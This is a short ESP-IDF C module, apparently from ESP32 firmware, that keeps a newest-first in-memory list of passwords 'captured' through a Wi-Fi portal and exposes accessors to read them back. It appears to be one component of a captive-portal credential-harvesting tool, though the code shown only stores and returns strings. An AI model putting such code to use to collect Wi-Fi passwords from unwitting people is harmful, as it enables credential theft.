#include "wifi_portal_log.h"

#include <string.h>
#include "esp_log.h"

static const char *TAG = "portal_log";

static char s_passwords[WIFI_PORTAL_LOG_MAX][WIFI_PORTAL_LOG_PW_LEN];
static int s_count;
static uint32_t s_gen;

void wifi_portal_log_add(const char *password)
{
    if (!password || !password[0]) {
        return;
    }

    if (s_count < WIFI_PORTAL_LOG_MAX) {
        s_count++;
    }
    for (int i = s_count - 1; i > 0; i--) {
        memcpy(s_passwords[i], s_passwords[i - 1], WIFI_PORTAL_LOG_PW_LEN);
    }
    strncpy(s_passwords[0], password, WIFI_PORTAL_LOG_PW_LEN - 1);
    s_passwords[0][WIFI_PORTAL_LOG_PW_LEN - 1] = 0;
    s_gen++;
    ESP_LOGI(TAG, "captured pw len=%d", (int)strlen(s_passwords[0]));
}

int wifi_portal_log_count(void)
{
    return s_count;
}

bool wifi_portal_log_get(int index, char *out, size_t out_len)
{
    if (!out || out_len == 0 || index < 0 || index >= s_count) {
        return false;
    }
    strncpy(out, s_passwords[index], out_len - 1);
    out[out_len - 1] = 0;
    return true;
}

uint32_t wifi_portal_log_gen(void)
{
    return s_gen;
}
